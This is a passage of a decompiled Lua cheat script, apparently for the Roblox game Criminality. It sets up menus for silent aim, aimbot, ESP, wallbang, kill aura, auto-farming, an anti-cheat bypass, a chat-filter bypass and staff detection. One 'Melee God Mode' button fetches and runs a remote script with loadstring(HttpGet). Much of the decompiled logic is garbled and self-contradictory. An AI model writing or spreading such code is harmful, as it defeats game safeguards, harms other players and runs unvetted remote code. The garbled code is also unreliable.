  Settings.Spin.Enabled = _ARG_0_
end, "SPIN"):AddSlider(0.1, 10, 1000000000, 10, function(_ARG_0_)
  Settings.Spin.Speed = _ARG_0_
end)
MainS:AddToggle("Toggle WalkSpeed", Settings.WalkSpeed.Enabled, function(_ARG_0_)
  Settings.WalkSpeed.Enabled = _ARG_0_
end, "WalkSpeedToggle"):AddKeybind("None")
MainS:AddToggle("Toggle WalkSpeed", Settings.WalkSpeed.Enabled, function(_ARG_0_)
  Settings.WalkSpeed.Enabled = _ARG_0_
end, "WalkSpeedToggle"):AddSlider(1, Settings.WalkSpeed.Amount, 35, 10, function(_ARG_0_)
  Settings.WalkSpeed.Amount = _ARG_0_
end)
MainS:AddToggle("Toggle JumpPower", Settings.JumpPower.Enabled, function(_ARG_0_)
  Settings.JumpPower.Enabled = _ARG_0_
end, "JumpPowerToggle"):AddKeybind("None")
MainS:AddToggle("Toggle JumpPower", Settings.JumpPower.Enabled, function(_ARG_0_)
  Settings.JumpPower.Enabled = _ARG_0_
end, "JumpPowerToggle"):AddSlider(1, Settings.JumpPower.Amount, 85, 10, function(_ARG_0_)
  Settings.JumpPower.Amount = _ARG_0_
end)
MainS:AddButton("Melee God Mode", function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Tobias020108Back/YBA-AUT/main/Criminality-Semi-Godmode.lua", true))()
  SendIT("God Mode Activated.", 15)
end)
CustomS:AddDropdown("Hit Sounds", {
  "Yamete",
  "Suka",
  "Boink",
  "TF2",
  "Rust",
  "CSGO",
  "Hitmarker"
}, "Yamete", false, function(_ARG_0_)
  if _ARG_0_ == "Boink" then
  elseif _ARG_0_ == "TF2" then
  elseif _ARG_0_ == "Rust" then
  elseif _ARG_0_ == "CSGO" then
  elseif _ARG_0_ == "Hitmarker" then
  elseif _ARG_0_ == "Yamete" then
  else
  end
  Settings.CustomHitSound = 5559988698
  for _FORV_5_, _FORV_6_ in pairs(game:GetService("ReplicatedStorage").Storage.HitStuff.Main:GetDescendants()) do
    if _FORV_6_:IsA("Sound") then
      _FORV_6_.SoundId = "rbxassetid://" .. 5559988698
    end
  end
  if not 5559988698 then
    Player.PlayerGui:FindFirstChild("MouseGUI").HitmarkerSound.SoundId = "rbxassetid://" .. 5559988698
    Player.PlayerGui:FindFirstChild("MouseGUI").HeadshotSound.SoundId = "rbxassetid://" .. 5559988698
  end
end)
CustomS:AddSlider("Hitsound Volume", 0, Settings.VolumeHitsound, 10, 10, function(_ARG_0_)
  Settings.VolumeHitsound = _ARG_0_
end)
GunModsS:AddToggle("No Recoil", Settings.GunMods.NoRecoil, function(_ARG_0_)
  Settings.GunMods.NoRecoil = _ARG_0_
  if _ARG_0_ == true then
    GunModules()
  end
end):AddKeybind("None")
GunModsS:AddToggle("Custom Spread", Settings.GunMods.Spread, function(_ARG_0_)
  Settings.GunMods.Spread = _ARG_0_
  if _ARG_0_ == true then
    GunModules()
  end
end, "SpreadToggle"):AddKeybind("None")
GunModsS:AddToggle("Custom Spread", Settings.GunMods.Spread, function(_ARG_0_)
  Settings.GunMods.Spread = _ARG_0_
  if _ARG_0_ == true then
    GunModules()
  end
end, "SpreadToggle"):AddSlider(0, Settings.GunMods.SpreadAmount, 50, 10, function(_ARG_0_)
  Settings.GunMods.SpreadAmount = _ARG_0_
  GunModules()
end)
GunModsS:AddToggle("Instant Equip", Settings.GunMods.InstantEquip, function(_ARG_0_)
  Settings.GunMods.InstantEquip = _ARG_0_
  if _ARG_0_ == true then
    GunModules()
  end
end):AddKeybind("None")
GunModsS:AddToggle("Instant Aim", Settings.GunMods.InstantAim, function(_ARG_0_)
  Settings.GunMods.InstantAim = _ARG_0_
  if _ARG_0_ == true then
    GunModules()
  end
end):AddKeybind("None")
GunModsS:AddToggle("Full Auto", Settings.GunMods.BurstEnabled, function(_ARG_0_)
  Settings.GunMods.BurstEnabled = _ARG_0_
  if _ARG_0_ == true then
    GunModules()
  end
end, "RAILTOGGLE"):AddKeybind("None")
GunModsS:AddSlider("Rounds Per Second", 1, Settings.GunMods.BurstRate, 100, 10, function(_ARG_0_)
  Settings.GunMods.BurstRate = _ARG_0_
  GunModules()
end)
GunModsS:AddSlider("Rounds Per Burst", 1, Settings.GunMods.BurstAmount, 100, 10, function(_ARG_0_)
  Settings.GunMods.BurstAmount = _ARG_0_
  GunModules()
end)
GunModsS:AddToggle("WallBang", nil, function(_ARG_0_)
  if _ARG_0_ == true then
    game:GetService("Workspace").Map.Parts.M_Parts.Parent = game:GetService("Workspace").CurrentCamera.Bullets
    SendIT("Wallbang Activated.", 15)
  elseif game:GetService("Workspace").CurrentCamera.Bullets:FindFirstChild("M_Parts") then
    game:GetService("Workspace").CurrentCamera.Bullets.M_Parts.Parent = game:GetService("Workspace").Map.Parts
    SendIT("Wallbang Deactivated.", 15)
  end
end):AddKeybind("None")
CustomT:AddToggle("Chat Bypass: Ez", Settings.EZBypass, function(_ARG_0_)
  Settings.EZBypass = _ARG_0_
  if _ARG_0_ == true and not EzBypassActivated then
    EzBypassActivated = true
    EzChatBypass()
  end
end):AddKeybind("None")
CustomT:AddToggle("Kill Say", nil, function(_ARG_0_)
  Settings.KillSay = _ARG_0_
end):AddKeybind("None")
game.Players.LocalPlayer.PlayerGui.CoreGUI:WaitForChild("KillFrame").ChildAdded:Connect(function()
  if Settings.KillSay then
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(_UPVALUE0_[math.random(1, #_UPVALUE0_)], "All")
  end
end)
CustomT:AddToggle("Infinite Pepper Spray", Settings.InfinitePepperSpray, function(_ARG_0_)
  Settings.InfinitePepperSpray = _ARG_0_
end)
CustomT:AddToggle("Pepper Spray Aura", Settings.PepperSprayAura, function(_ARG_0_)
  Settings.PepperSprayAura = _ARG_0_
end)
if KRNL_LOADED or not nil then
  AntiCheatActivated = true
  BypassAnticheat()
end
CustomT:AddToggle("Toggle Anti Cheat", AntiCheatActivated, function(_ARG_0_)
  if _ARG_0_ == true and _ARG_0_ then
    AntiCheatActivated = true
    BypassAnticheat()
  end
end)
Framework.theme.cursorimg = "https://t0.rbxcdn.com/42f66da98c40252ee151326a82aab51f"
Framework.theme.cursor = true
if not nil and not nil then
  if pcall(function()
    Framework.cursor = Drawing.new("Image")
    Framework.cursor.Data = game:HttpGet(Framework.theme.cursorimg)
    Framework.cursor.Size = Vector2.new(64, 64)
    Framework.cursor.Visible = false
    Framework.cursor.Rounding = 0
    Framework.cursor.Position = Vector2.new(Mouse.X - 32, 3 + 6)
  end) and not nil then
    game:GetService("UserInputService").InputChanged:Connect(function(_ARG_0_)
      if not _ARG_0_ and _ARG_0_.UserInputType == Enum.UserInputType.MouseMovement then
        Framework.cursor.Position = Vector2.new(game:GetService("Players").LocalPlayer:GetMouse().X - 32, 4 + 6)
      end
    end)
  elseif nil and Framework.cursor then
    Framework.cursor:Destroy()
  end
end
CustomT:AddButton("Remove Textures", function()
  for _FORV_3_, _FORV_4_ in pairs(workspace:GetDescendants()) do
    if _FORV_4_.ClassName == "Part" or _FORV_4_.ClassName == "SpawnLocation" or _FORV_4_.ClassName == "WedgePart" or _FORV_4_.ClassName == "Terrain" or _FORV_4_.ClassName == "MeshPart" then
      _FORV_4_.Material = "Plastic"
    end
  end
  for _FORV_3_, _FORV_4_ in pairs(workspace:GetDescendants()) do
    if _FORV_4_.ClassName == "Decal" or _FORV_4_.ClassName == "Texture" then
      _FORV_4_:Destroy()
    end
  end
  SendIT("No Textures Activated.", 15)
end)
KillAuraCoolDown = false
FinishAuraCoolDown = false
CustomK:AddToggle("Kill Aura", Settings.KillAura, function(_ARG_0_)
  Settings.KillAura = _ARG_0_
end):AddKeybind("None")
CustomK:AddToggle("Finish Aura", Settings.FinishAura, function(_ARG_0_)
  Settings.FinishAura = _ARG_0_
end):AddKeybind("None")
CustomF:AddToggle("Auto Farm Safe", nil, function(_ARG_0_)
  ITHAPPEN = false
  if _ARG_0_ == true then
    SafeAutoFarm = true
    clipping = game:GetService("RunService").RenderStepped:Connect(function()
      if nil and nil then
        ITHAPPEN = true
        wait(10)
        ITHAPPEN = false
        return
      end
      if not game.Players.LocalPlayer.Character:FindFirstChild("Head") and not ITHAPPEN then
        ITHAPPEN = true
        wait(10)
        ITHAPPEN = false
        return
      end
      if game.Players.LocalPlayer.Character and not ITHAPPEN then
        ITHAPPEN = true
        wait(10)
        ITHAPPEN = false
        return
      end
      if not (0 < game.Players.LocalPlayer.Character:FindFirstChild("Humanoid").Health) and game.Players.LocalPlayer.Character then
        ITHAPPEN = true
        wait(10)
        ITHAPPEN = false
        return
      end
      if not game.Players.LocalPlayer.Name and game.Players.LocalPlayer.Name then
        ITHAPPEN = true
        wait(10)
        ITHAPPEN = false
        return
      end
      if not 10 or game.Players.LocalPlayer.Character:FindFirstChildOfClass("ForceField") or not clipping then
        return
      end
      if GetSafe(math.huge, false) ~= nil and GetCash(10) == nil and SafeAutoFarm and 10 and game:GetService("Players").LocalPlayer.Character.Humanoid.Health >= 15 then
        coroutine.resume(coroutine.create(function()
          coroutine.resume(coroutine.create(function()
            wait(15)
            SafeAutoFarmCoolDown = false
          end))
          SafeAutoFarmCoolDown = true
          if not game:GetService("Players").LocalPlayer.Character or not game:GetService("Players").LocalPlayer.Backpack then
            coroutine.resume(coroutine.create(function()
              game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
              game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Crowbar"))
            end))
            Teleport(1 + 2)
          else
            Teleport(2 + 3)
            coroutine.resume(coroutine.create(function()
              game:GetService("ReplicatedStorage").Events.SSHPRMTE1:InvokeServer("IllegalStore", "Melees", "Crowbar", GetDealer2(math.huge, "Dealer"))
            end))
            repeat
              wait()
            until game:GetService("Players").LocalPlayer.Character:FindFirstChild("Crowbar") or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Crowbar")
          end
        end))
      end
    end)
    sipping = game:GetService("RunService").RenderStepped:Connect(function()
      coroutine.resume(coroutine.create(function()
        if not game:GetService("Players").LocalPlayer.Character and not 15 and not AutoBreakSafeCoolDown then
          AutoBreakSafeCoolDown = true
          HitAugs((GetSafe(15)))
          wait(0.5)
          AutoBreakSafeCoolDown = false
        end
      end))
    end)
  end
  if _ARG_0_ == false and clipping then
    NewSafeAutoFarm = false
    clipping:Disconnect()
  end
  if _ARG_0_ == false and sipping then
    NewSafeAutoFarm = false
    sipping:Disconnect()
  end
end):AddKeybind("None")
CustomF:AddToggle("Auto Farm Scrap", nil, function(_ARG_0_)
  if _ARG_0_ == true then
    ScrapAutoFarm = true
    clipping = game:GetService("RunService").RenderStepped:Connect(function()
      if not nil and nil and game:GetService("Players").LocalPlayer.Character.Humanoid.Health > 15 then
        coroutine.resume(coroutine.create(function()
          coroutine.resume(coroutine.create(function()
            wait(10)
            ScrapAutoFarmCoolDown = false
          end))
          ScrapAutoFarmCoolDown = true
          if not game:GetService("Workspace").Filter.SpawnedPiles then
            Teleport(GetScrap(math.huge).Position)
            wait(5)
            Teleport(1 + 2)
            for _FORV_3_, _FORV_4_ in ipairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
              if not ipairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) then
                coroutine.resume(coroutine.create(function()
                  game:GetService("ReplicatedStorage").Events.SSHPRMTE1:InvokeServer("IllegalStore", "Melees", _UPVALUE0_.Name, GetDealer2(math.huge, "Dealer"), "Sell")
                end))
                coroutine.resume(coroutine.create(function()
                  game:GetService("ReplicatedStorage").Events.SSHPRMTE1:InvokeServer("IllegalStore", "Guns", _UPVALUE0_.Name, GetDealer2(math.huge, "Dealer"), "Sell")
                end))
                coroutine.resume(coroutine.create(function()
                  game:GetService("ReplicatedStorage").Events.SSHPRMTE1:InvokeServer("IllegalStore", "Throwables", _UPVALUE0_.Name, GetDealer2(math.huge, "Dealer"), "Sell")
                end))
                coroutine.resume(coroutine.create(function()
                  game:GetService("ReplicatedStorage").Events.SSHPRMTE1:InvokeServer("IllegalStore", "Misc", _UPVALUE0_.Name, GetDealer2(math.huge, "Dealer"), "Sell")
                end))
              end
            end
            for _FORV_3_, _FORV_4_ in ipairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
              if not ipairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) then
                coroutine.resume(coroutine.create(function()
                  game:GetService("ReplicatedStorage").Events.SSHPRMTE1:InvokeServer("IllegalStore", "Melees", _UPVALUE0_.Name, GetDealer2(math.huge, "Dealer"), "Sell")
                end))
                coroutine.resume(coroutine.create(function()
                  game:GetService("ReplicatedStorage").Events.SSHPRMTE1:InvokeServer("IllegalStore", "Guns", _UPVALUE0_.Name, GetDealer2(math.huge, "Dealer"), "Sell")
                end))
                coroutine.resume(coroutine.create(function()
                  game:GetService("ReplicatedStorage").Events.SSHPRMTE1:InvokeServer("IllegalStore", "Throwables", _UPVALUE0_.Name, GetDealer2(math.huge, "Dealer"), "Sell")
                end))
                coroutine.resume(coroutine.create(function()
                  game:GetService("ReplicatedStorage").Events.SSHPRMTE1:InvokeServer("IllegalStore", "Misc", _UPVALUE0_.Name, GetDealer2(math.huge, "Dealer"), "Sell")
                end))
              end
            end
          else
          end
        end))
      end
    end)
    sipping = game:GetService("RunService").RenderStepped:Connect(function()
    end)
  elseif clipping or not _ARG_0_ then
    SafeAutoFarm = false
    clipping:Disconnect()
    sipping:Disconnect()
  end
end):AddKeybind("None")
SilentAimS:AddSeperator("Silent Aim")
SilentAimS:AddToggle("Toggle Silent Aim", SilentSettings.Main.Enabled, function(_ARG_0_)
  SilentSettings.Main.Enabled = _ARG_0_
  if _ARG_0_ == true and _ARG_0_ then
    SilentAimActivated = true
    SilentAim()
  end
end):AddKeybind("None")
SilentAimS:AddToggle("Whitelist Friends", SilentSettings.Main.Whitelist, function(_ARG_0_)
  SilentSettings.Main.Whitelist = _ARG_0_
end):AddKeybind("None")
SilentAimS:AddSlider("Hit Chance", 1, Settings.HitChance.Percentage, 100, 10, function(_ARG_0_)
  Settings.HitChance.Percentage = _ARG_0_
end)
SilentAimS:AddDropdown("Hit Part", {
  "Head",
  "Torso",
  "Right Leg",
  "Left Leg",
  "Random"
}, "Head", false, function(_ARG_0_)
  SilentSettings.Main.TargetPart = _ARG_0_
end)
SilentAimS:AddToggle("Silent Aim Field of View", SilentSettings.FOVSettings.Visible, function(_ARG_0_)
  SilentSettings.FOVSettings.Visible = _ARG_0_
  SilentAIMFov.Visible = _ARG_0_
end):AddKeybind("None")
SilentAimS:AddSlider("Radius", 5, SilentSettings.FOVSettings.Radius, 1080, 10, function(_ARG_0_)
  SilentSettings.FOVSettings.Radius = _ARG_0_
  SilentAIMFov.Radius = _ARG_0_
end)
SilentAimS:AddSeperator("Aimbot")
SilentAimS:AddToggle("Toggle Aimbot", false, function(_ARG_0_)
  getgenv().Enabled = _ARG_0_
  getgenv().AimRadius = 50
  getgenv().ThirdPerson = false
  getgenv().FirstPerson = _ARG_0_
  getgenv().TeamCheck = false
  getgenv().PredictMovement = false
  getgenv().PredictionVelocity = 10
  if _ARG_0_ == true and not AimBotActivated then
    AimBotActivated = true
    _UPVALUE0_()
  end
end):AddKeybind("None")
SilentAimS:AddToggle("Whitelist Friends", Settings.Aimbot.Whitelist, function(_ARG_0_)
  Settings.Aimbot.Whitelist = _ARG_0_
end):AddKeybind("None")
SilentAimS:AddDropdown("Hit Part", {
  "Head",
  "Torso",
  "Right Leg",
  "Left Leg"
}, "Head", false, function(_ARG_0_)
  _G.HitPart = _ARG_0_
end)
SilentAimS:AddToggle("Toggle Prediction Aim", false, function(_ARG_0_)
  getgenv().PredictMovement = _ARG_0_
end, "PREDICTION"):AddKeybind("None")
SilentAimS:AddToggle("Toggle Prediction Aim", false, function(_ARG_0_)
  getgenv().PredictMovement = _ARG_0_
end, "PREDICTION"):AddSlider(1, 10, 50, 10, function(_ARG_0_)
  getgenv().PredictionVelocity = _ARG_0_
end)
PlayerEspS:AddToggle("Toggle All ESP's", ESPSettings.PlayerESP.Enabled, function(_ARG_0_)
  ESPSettings.PlayerESP.Enabled = _ARG_0_
  ESPFramework.Color = ESPSettings.ESPColor
  ESPFramework.ToolColor = ESPSettings.ToolColor
  ESPFramework.Tracers = ESPSettings.PlayerESP.TracersOn
  ESPFramework.Names = ESPSettings.PlayerESP.NamesOn
  ESPFramework.Health = ESPSettings.PlayerESP.HealthOn
  ESPFramework.Distance = ESPSettings.PlayerESP.DistanceOn
  ESPFramework.Tool = ESPSettings.PlayerESP.ToolOn
  ESPFramework.Boxes = ESPSettings.PlayerESP.BoxesOn
  ESPFramework.FaceCamera = ESPSettings.PlayerESP.FaceCamOn
  ESPFramework:Toggle(ESPSettings.PlayerESP.Enabled)
end):AddKeybind("None")
PlayerEspS:AddToggle("Highlight", false, function(_ARG_0_)
  if _ARG_0_ then
    for _FORV_4_, _FORV_5_ in pairs(game:GetService("Players"):GetPlayers()) do
      if _FORV_5_ ~= Player then
        Instance.new("Highlight", game:GetService("CoreGui")).Name = _FORV_5_.Name
        Instance.new("Highlight", game:GetService("CoreGui")).Adornee = _FORV_5_.Character
        Instance.new("Highlight", game:GetService("CoreGui")).DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        Instance.new("Highlight", game:GetService("CoreGui")).OutlineColor = ESPFramework.Color
        Instance.new("Highlight", game:GetService("CoreGui")).FillTransparency = 1
        Instance.new("Highlight", game:GetService("CoreGui")).FillColor = ESPFramework.Color
      end
    end
  elseif pairs(game:GetService("Players"):GetPlayers()) then
    for _FORV_4_, _FORV_5_ in pairs(game:GetService("CoreGui"):GetChildren()) do
      if not pairs(game:GetService("CoreGui"):GetChildren()) then
        _FORV_5_:Destroy()
      end
    end
  end
end):AddKeybind("None")
PlayerEspS:AddToggle("Boxes", ESPSettings.PlayerESP.BoxesOn, function(_ARG_0_)
  ESPSettings.PlayerESP.BoxesOn = _ARG_0_
  ESPFramework.Boxes = ESPSettings.PlayerESP.BoxesOn
end):AddKeybind("None")
PlayerEspS:AddToggle("Tracers", ESPSettings.PlayerESP.TracersOn, function(_ARG_0_)
  ESPSettings.PlayerESP.TracersOn = _ARG_0_
  ESPFramework.Tracers = ESPSettings.PlayerESP.TracersOn
end):AddKeybind("None")
PlayerEspS:AddToggle("Name", ESPSettings.PlayerESP.NamesOn, function(_ARG_0_)
  ESPSettings.PlayerESP.NamesOn = _ARG_0_
  ESPFramework.Names = ESPSettings.PlayerESP.NamesOn
end):AddKeybind("None")
PlayerEspS:AddToggle("Health", ESPSettings.PlayerESP.HealthOn, function(_ARG_0_)
  ESPSettings.PlayerESP.HealthOn = _ARG_0_
  ESPFramework.Health = ESPSettings.PlayerESP.HealthOn
end):AddKeybind("None")
PlayerEspS:AddToggle("Distance", ESPSettings.PlayerESP.DistanceOn, function(_ARG_0_)
  ESPSettings.PlayerESP.DistanceOn = _ARG_0_
  ESPFramework.Distance = ESPSettings.PlayerESP.DistanceOn
end):AddKeybind("None")
PlayerEspS:AddToggle("Tool", ESPSettings.PlayerESP.ToolOn, function(_ARG_0_)
  ESPSettings.PlayerESP.ToolOn = _ARG_0_
  ESPFramework.Tool = ESPSettings.PlayerESP.ToolOn
end):AddKeybind("None")
PlayerEspS:AddToggle("Face Cam", ESPSettings.PlayerESP.FaceCamOn, function(_ARG_0_)
  ESPSettings.PlayerESP.FaceCamOn = _ARG_0_
  ESPFramework.FaceCamera = ESPSettings.PlayerESP.FaceCamOn
end):AddKeybind("None")
PlayerEspS:AddSlider("ESP Text Size", 0, ESPFramework.Size, 50, 10, function(_ARG_0_)
  ESPFramework.Size = _ARG_0_
end)
PlayerEspS:AddSlider("ESP Distance", 0, ESPSettings.PlayerESP.Distance, 2000, 10, function(_ARG_0_)
  ESPFramework.DistanceS = _ARG_0_
  ESPSettings.PlayerESP.Distance = _ARG_0_
end)
PlayerEspS:AddDropdown("Health Parenthasis", {
  "None",
  "<>",
  "{}",
  "[]"
}, "<>", false, function(_ARG_0_)
  ESPFramework.HealthCustom = _ARG_0_
end)
DealersESP:AddToggle("Toggle Drug", false, function(_ARG_0_)
  ESPFramework.DealerESP = _ARG_0_
end):AddKeybind("None")
DealersESP:AddToggle("Toggle Armory", false, function(_ARG_0_)
  ESPFramework.ArmoryDealerESP = _ARG_0_
end):AddKeybind("None")
AtmsESP:AddToggle("Toggle ATM", false, function(_ARG_0_)
  ESPFramework.AtmESP = _ARG_0_
end):AddKeybind("None")
ScrapEspS:AddToggle("Scrap ESP", ESPSettings.ScrapESP.Enabled, function(_ARG_0_)
  ESPSettings.ScrapESP.Enabled = _ARG_0_
  if _ARG_0_ == true then
    for _FORV_4_, _FORV_5_ in pairs(game:GetService("Workspace").Filter.SpawnedPiles:GetChildren()) do
      coroutine.wrap(ScrapESP)(_FORV_5_)
    end
  end
end):AddKeybind("None")
ScrapEspS:AddToggle("Legendary Only", ESPSettings.ScrapESP.LegendaryOnly, function(_ARG_0_)
  ESPSettings.ScrapESP.LegendaryOnly = _ARG_0_
end)
ScrapEspS:AddToggle("Rare Only", ESPSettings.ScrapESP.RareOnly, function(_ARG_0_)
  ESPSettings.ScrapESP.RareOnly = _ARG_0_
end)
ScrapEspS:AddToggle("Good Only", ESPSettings.ScrapESP.GoodOnly, function(_ARG_0_)
  ESPSettings.ScrapESP.GoodOnly = _ARG_0_
end)
ScrapEspS:AddToggle("Bad Only", ESPSettings.ScrapESP.BadOnly, function(_ARG_0_)
  ESPSettings.ScrapESP.BadOnly = _ARG_0_
end)
ScrapEspS:AddSlider("Scrap Distance", 0, ESPSettings.ScrapESP.Distance, 2000, 10, function(_ARG_0_)
  ESPSettings.ScrapESP.Distance = _ARG_0_
end)
SafeEspS:AddToggle("Safe ESP", ESPSettings.SafeESP.Enabled, function(_ARG_0_)
  ESPSettings.SafeESP.Enabled = _ARG_0_
  if _ARG_0_ == true then
    for _FORV_4_, _FORV_5_ in pairs(game:GetService("Workspace").Map.BredMakurz:GetChildren()) do
      if tonumber(_FORV_5_:FindFirstChild("Type").Value) == 2 then
        coroutine.wrap(SafeESP)(_FORV_5_, 2)
      elseif tonumber(_FORV_5_:FindFirstChild("Type").Value) == 3 then
        coroutine.wrap(SafeESP)(_FORV_5_, 3)
      end
    end
  end
end):AddKeybind("None")
SafeEspS:AddToggle("Big Only", ESPSettings.SafeESP.BigOnly, function(_ARG_0_)
  ESPSettings.SafeESP.BigOnly = _ARG_0_
end)
SafeEspS:AddToggle("Small Only", ESPSettings.SafeESP.SmallOnly, function(_ARG_0_)
  ESPSettings.SafeESP.SmallOnly = _ARG_0_
end)
SafeEspS:AddSlider("Safe Distance", 0, ESPSettings.SafeESP.Distance, 2000, 10, function(_ARG_0_)
  ESPSettings.SafeESP.Distance = _ARG_0_
end)
RegisterEspS:AddToggle("Register ESP", ESPSettings.RegisterESP.Enabled, function(_ARG_0_)
  ESPSettings.RegisterESP.Enabled = _ARG_0_
  if _ARG_0_ == true then
    for _FORV_4_, _FORV_5_ in pairs(game:GetService("Workspace").Map.BredMakurz:GetChildren()) do
      if tonumber(_FORV_5_:FindFirstChild("Type").Value) == 1 then
        coroutine.wrap(RegisterESP)(_FORV_5_)
      end
    end
  end
end):AddKeybind("None")
RegisterEspS:AddSlider("Register Distance", 0, ESPSettings.RegisterESP.Distance, 2000, 10, function(_ARG_0_)
  ESPSettings.RegisterESP.Distance = _ARG_0_
end)
ViewmodelS:AddToggle("Toggle ViewModel", Settings.ViewModel.Enabled, function(_ARG_0_)
  Settings.ViewModel.Enabled = _ARG_0_
end):AddKeybind("None")
ViewmodelS:AddColorpicker("Viewmodel Color", Color3.new(1, 1, 1), function(_ARG_0_)
  Settings.ViewModel.Viewmodel.Color = _ARG_0_
end)
ViewmodelS:AddDropdown("Viewmodel Material", {
  "ForceField",
  "Plastic",
  "Wood",
  "Slate",
  "Concrete"
}, "ForceField", false, function(_ARG_0_)
  if _ARG_0_ == "ForceField" then
  elseif _ARG_0_ == "Plastic" then
  elseif _ARG_0_ == "Wood" then
  elseif _ARG_0_ == "Slate" then
  elseif _ARG_0_ == "Concrete" then
  end
  Settings.ViewModel.Viewmodel.Material = Enum.Material.Concrete
end)
ViewmodelS:AddColorpicker("Guns Color", Color3.new(1, 1, 1), function(_ARG_0_)
  Settings.ViewModel.Guns.Color = _ARG_0_
end)
ViewmodelS:AddDropdown("Guns Material", {
  "ForceField",
  "Plastic",
  "Wood",
  "Slate",
  "Concrete"
}, "Plastic", false, function(_ARG_0_)
  if _ARG_0_ == "ForceField" then
  elseif _ARG_0_ == "Plastic" then
  elseif _ARG_0_ == "Wood" then
  elseif _ARG_0_ == "Slate" then
  elseif _ARG_0_ == "Concrete" then
  end
  Settings.ViewModel.Guns.Material = Enum.Material.Concrete
end)
ViewmodelS:AddColorpicker("Melees Color", Color3.new(1, 1, 1), function(_ARG_0_)
  Settings.ViewModel.Melees.Color = _ARG_0_
end)
ViewmodelS:AddDropdown("Melees Material", {
  "ForceField",
  "Plastic",
  "Wood",
  "Slate",
  "Concrete"
}, "ForceField", false, function(_ARG_0_)
  if _ARG_0_ == "ForceField" then
  elseif _ARG_0_ == "Plastic" then
  elseif _ARG_0_ == "Wood" then
  elseif _ARG_0_ == "Slate" then
  elseif _ARG_0_ == "Concrete" then
  end
  Settings.ViewModel.Melees.Material = Enum.Material.Concrete
end)
ViewmodelS:AddToggle("Hide Left Arm", Settings.ViewModel.LeftArmOff, function(_ARG_0_)
  Settings.ViewModel.LeftArmOff = _ARG_0_
end):AddKeybind("None")
STAFFON = true
StaffDetect:AddToggle("Enable Staff Detector", Settings.StaffDetector.Enabled, function(_ARG_0_)
  Settings.StaffDetector.Enabled = _ARG_0_
  if _ARG_0_ == true and _ARG_0_ then
    STAFFON = false
    for _FORV_4_, _FORV_5_ in pairs(game:GetService("Players"):GetPlayers()) do
      CheckStaff(_FORV_5_)
    end
  end
  if _ARG_0_ == false then
    STAFFON = false
  end
end)
StaffDetect:AddDropdown("Staff Detector Action", {"Notify", "Kick"}, "Notify", false, function(_ARG_0_)
  Settings.StaffDetector.Type = _ARG_0_
end)
AutoBreaks:AddToggle("Auto Safe: Lockpick", nil, function(_ARG_0_)
  if _ARG_0_ == true then
    render = game:GetService("RunService").RenderStepped:Connect(AutoLockpick)
  elseif _ARG_0_ == false and not _ARG_0_ then
    render:Disconnect()
  end
end):AddKeybind("None")
AutoBreaks:AddToggle("Auto Safe: Crowbar", nil, function(_ARG_0_)
  if _ARG_0_ == true then
    render = game:GetService("RunService").RenderStepped:Connect(AutoCrowbar)
  elseif _ARG_0_ == false and not _ARG_0_ then
    render:Disconnect()
  end
end):AddKeybind("None")
AutoBreaks:AddToggle("Auto Register: Fist", nil, function(_ARG_0_)
  if _ARG_0_ == true then
    render = game:GetService("RunService").RenderStepped:Connect(AutoRegister)
  elseif _ARG_0_ == false and not _ARG_0_ then
    render:Disconnect()
  end
end):AddKeybind("None")
CreditsS:AddSeperator("Specials | Contributors")
CreditsS:AddLabel("sakuya#3036 - Founder - 15/04/2022")
CreditsS:AddLabel("Fanya#6470 - Scripter - 25/04/2022")
CreditsS:AddSeperator("Wise Words")
CreditsS:AddLabel("Buy Premium")
CreditsS:AddLabel("- Fanya#6470")
CreditsS:AddSeperator("Legend")
CreditsS:AddLabel("[!] = Performance Issues")
CreditsS:AddLabel("[?] = Detectable?")
InfoS:AddToggle("Open / Close", true, function(_ARG_0_)
  game:GetService("CoreGui"):FindFirstChild(Version).Enabled = _ARG_0_
  Framework.cursor.Visible = _ARG_0_
  game:GetService("UserInputService").OverrideMouseIconBehavior = Enum.OverrideMouseIconBehavior.None
end):AddKeybind(Enum.KeyCode.LeftAlt)
InfoS:AddSeperator("Rainbow Configurations")
InfoS:AddToggle("Toggle Rainbow UI", false, function(_ARG_0_)
  if _ARG_0_ == true then
  end
  if _ARG_0_ == true then
    _UPVALUE1_ = 1
    coroutine.resume((coroutine.create(function()
      while wait() do
        Framework.theme.accentcolor = Color3.fromHSV(tick() % _UPVALUE0_ / _UPVALUE0_, 1, 1)
        Framework.theme.accentcolor2 = Color3.fromHSV(tick() % _UPVALUE0_ / _UPVALUE0_, 1, 1)
        FemWare:UpdateBackground()
        if _UPVALUE1_ == 2 then
          coroutine.yield(_UPVALUE2_)
        end
      end
    end)))
  else
    _UPVALUE1_ = 2
  end
end, "RAINBOW"):AddKeybind("None")
InfoS:AddToggle("Toggle Rainbow UI", false, function(_ARG_0_)
  if _ARG_0_ == true then
  end
  if _ARG_0_ == true then
    _UPVALUE1_ = 1
    coroutine.resume((coroutine.create(function()
      while wait() do
        Framework.theme.accentcolor = Color3.fromHSV(tick() % _UPVALUE0_ / _UPVALUE0_, 1, 1)
        Framework.theme.accentcolor2 = Color3.fromHSV(tick() % _UPVALUE0_ / _UPVALUE0_, 1, 1)
        FemWare:UpdateBackground()
        if _UPVALUE1_ == 2 then
          coroutine.yield(_UPVALUE2_)
        end
      end
    end)))
  else
    _UPVALUE1_ = 2
  end
end, "RAINBOW"):AddSlider(0, 5, 150, 1000000000000, function(_ARG_0_)
  _UPVALUE0_ = _ARG_0_
end)
InfoS:AddToggle("Toggle Rainbow ESP", false, function(_ARG_0_)
  if _ARG_0_ == true then
  end
  if _ARG_0_ == true then
    _UPVALUE1_ = 1
    coroutine.resume((coroutine.create(function()
      while not nil do
        ESPFramework.Color = Color3.fromHSV(tick() % _UPVALUE0_ / _UPVALUE0_, 1, 1)
        if _UPVALUE1_ == 2 then
          coroutine.yield(_UPVALUE2_)
        end
      end
    end)))
  else
    _UPVALUE1_ = 2
  end
end, "RAINBOWS"):AddKeybind("None")
InfoS:AddToggle("Toggle Rainbow ESP", false, function(_ARG_0_)
